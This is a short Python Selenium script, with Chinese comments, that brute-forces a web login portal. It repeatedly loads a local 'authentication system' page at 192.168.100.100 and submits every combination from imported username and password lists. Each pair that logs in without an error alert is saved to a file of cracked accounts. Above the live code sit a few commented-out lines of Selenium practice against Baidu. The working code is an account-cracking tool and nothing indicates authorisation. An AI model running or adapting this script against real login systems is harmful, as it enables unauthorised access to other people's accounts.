# from selenium import webdriver
# import time
# brguge = webdriver.Firefox()
# brguge.get('http://baidu.com')
# # time.sleep(3)
# # brguge.get('http://qq.com')
# # time.sleep(3)
# # brguge.back()
# # print('Loading Compelete')
# brguge.find_element_by_xpath('//*[@id="kw"]').send_keys('python')#定位属性name 值为“username”并填入
# # brguge.find_element_by_tag_name('p').send_keys('selenium')#定位属性name 值为“password”并填入
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import AccountAndPassword,os
os.chdir('C:\\Users\\Turbo\\Desktop\\python2')
accfile = open('.\\account.txt','a')
driver = webdriver.Firefox()
while  '认证系统'  not in driver.title:
	driver.get("http://192.168.100.100")
# assert "百度" in driver.title#用assert的方式确认标题是否包含“百度”一词
elem = driver.find_element_by_xpath('//*[@id="exampleInputEmail1"]')
elemp = driver.find_element_by_xpath('//*[@id="exampleInputPassword1"]')
users = []
passw = []
users = AccountAndPassword.accountNum(users)
passw = AccountAndPassword.Password(passw)
print(len(users),len(passw))
for u in users:
	for p in passw:
		elem.clear()
		elem.send_keys(u)
		elemp.clear()
		elemp.send_keys(p)
		elem.send_keys(Keys.RETURN)
		try:
			alert = driver.switch_to_alert()
		except Exception:
			alert = None
		if alert==None:
			print(u+' : '+p+'登录成功')
			accfile.write(u+' : '+p+'登录成功')
			break
		else:
			# print(alert.text)
			alert.accept()

# assert "No results found." not in driver.page_source
# driver.close()